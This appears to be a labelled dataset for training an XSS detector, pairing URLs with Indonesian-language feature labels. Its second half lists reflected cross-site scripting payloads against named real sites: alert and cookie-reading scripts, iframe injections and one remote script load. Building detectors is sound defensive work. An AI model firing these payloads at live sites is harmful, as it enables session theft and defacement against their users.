tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.topix.com/rss/arts/theater.xml;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.topmargin.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.toyota.co.jp/en/index.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.transnational.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.trillia.com/moser-number.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.trust-chem.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.ttt.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.tu-chemnitz.de/informatik/RA/cchp/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.tunarez.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.tyhg.com.cn/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.upeace.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.upfcindia.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.users.zetnet.co.uk/hopwood/crypto/scan/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.utsc.utoronto.ca/~binnick/old%20tense/BIBLIO.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.uwsp.edu/history/wipcs/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.vaibhavind.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.vancouverplays.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.vauxhall.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.veBlank atau CTOrkids.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.vibrationdata.com/Laplace.htm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.visualfractions.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.visualmathlearning.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.volvo.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.volvocars.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.vterrain.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.vw.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.westwardindustries.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.winterbotham.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.wisdom.weizmann.ac.il/~yakov/thebook.pdf;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.worldclassresumes.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.worldscientific.com/worldscinet/ijhsc;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.zawya.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www2.let.uu.nl/Uil-OTS/Lexicon/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www3.cs.stonybrook.edu/~algorith/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www3.cs.stonybrook.edu/~skiena/214/lectures/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttps://people.math.osu.edu/events/connes/Connes_course.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttps://sites.google.com/site/lettheshowbegin/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://118.tct.ir/exe/<ScrIpT>alert(String.fromCharCode(97, 51, 113))</ScRipT>;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://94932.forums.motigo.com/?action=email_send&boarduser_id=%22%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://9gag.com/signup?method=email&error=%3Cscript%3Ealert%28%27xss!%27%29;%3C/script%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://ads.yimg.com/a/a/ya/yahoo_camp/596307_092707_180x150_invite.swf?clickTAG=javascript:window.open(%27http://www.xssed.com%27);%20alert(%27XSSED%20by%20Viper.aT%27)\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://advertising.microsoft.com/austra123';alert(document.cookie);a='\";Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://alertes.wikio.fr/subscribe.php?feed=http%3A%2F%2Frss.labs.ebuzzing.fr%2Fpolitique.rss&lang=fr&email=\"\">&Submit=OK\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://amihackerproof.com/Results/index.php?query=%27%22%3E%3Ciframe+src%3D%2F%2Fxssed.com%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://amihackerproof.com/Results/tos.php?scan_id=25988%3C/script%3E%3Cscript%3Ealert(%27XSS%27);%3C/script%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://annuaire.maisondhotes.net/search.php?word=/\"\">&defaultsearch_submit.x=0&defaultsearch_submit.y=0\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://annuaire.phpsources.org/search.php?all=1&option=all&search=/\"\"><script>alert('XSS By Atm0n3r')</script>&image.x=0&image.y=0\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://aol.pogo.com/images/togo/flash/sltg-ww-underground.swf?clickTag=javascript:document.write(%27%3Cs%20cript%3Ealert(%22xss%20by%20m4x%22)%3C/script%3E%3Cfont%20size=%227%22%20color=%22red%22%3E%3Cmarquee%3EXSS%20BY%20M4X%3C/marquee%3E%3C/font%3E%27);Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://apps.facebook.com/caricatura/view.php?friend=501337&effect=&x=&y=%22/%3E%3Ciframesrc=\\0x27http://xssed.com%3E%3C/iframe%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://apps.webtrends.com/wizard/?boot=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://ar.netlog.com/go/search/view=people&q=%22%3E%3Cscript%3Ealert%281%29;%3C/script%3E&%22%3E%3Cscript%3Ealert%28511%29;%3C/script%3E=g\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://archive.icann.org/cgi-bin/udrp/udrp.cgi?q=%22onmouseover=alert%280x0c2012%29%20bad=%22;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://artslivres.com/ShowArticle.php?Id=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://au.msi.com/service/search/?kw=%22%3E%3Ciframe%20src=%22xssed.org%22%3E&type=product;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://bangalore.locanto.in/q/?query=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&group&dist=1;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://bank-maskan.ir/Page.aspx?search=%22%3E%3Cscript%3Ealert(%27By%20:%20Takpar%27)%3C/script%3E&mID=1418&Page=search/advancedsearch;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://bay-phone.org.ua/index.php?mag_search=Fucking Spamer !\"\"><script>alert(1)</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://beta.atiktuk.com/?s=%22%3E%3Cscript%3Ealert%28%223spi0n%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://biclopsgames.com/gameframe.php?id=7%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://blog.ok.net/skyr3x/page/2414/%22%3E%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E/;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://boom.ge/advanced_search.php?query=%22%20onmouseover%3dprompt%28907660%29%20bad%3d%22;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://boom.ge/search.php?query=1%3Cscript%3Eprompt%28922755%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://busca.globo.com/Busca/g1/?query=<script>alert(document.cookie)</script>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://byinvitationonlyphotos.americanexpress.com/photo.php?img=7259%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E&p=680%27&intlink=BIO_Twitter\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://c2.com/cgi/wiki?edit=%22%3E%3Cscript%3Ealert%28%22http://st2tea.blogspot.com%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://caloriecount.about.com/cc/search.php?searchpro=%3Cbody%20onload=alert(1)%3E&search_type=foods;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://cassons-les-idees-recues.com/p1.php?ml=/%22%3E%3Cscript%3Ealert%281%29%3C/script%3Efb71df71a0b2999179447d2beec66f37&O=4177&p=FR&SI=GA_JAN;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://catalogue.adidas.com/catalogue/ae/products/?keywords=%22;%20alert%28/XSS/%29;%20test=%22test\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://chat.stackexchange.com/?tab=site&sort=active&nohide=true&host=%27;alert%28String.fromCharCode%2888,83,83%29%29//\\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://chemicaltechnologyinc.com/search.php?type=Products&name=234G%22%3E%3Cscript%20src=http://www.planetcreator.net/attacking/xss/planetcreator-xss.js%3E%3C/script%3E%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://chicago.citysearch.com/listings/chicago-il-metro/_script_alert_XSS_by_w4r3z_script_/82078?what=%3Cscript%3E+alert+(%22XSS+BY+w4r3z%22)+%3C%2Fscript%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://chromium-browser-symbols.commondatastorage.googleapis.com/index.html?path=%22%3E%3Cscript%3Ealert(%27XSS%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript 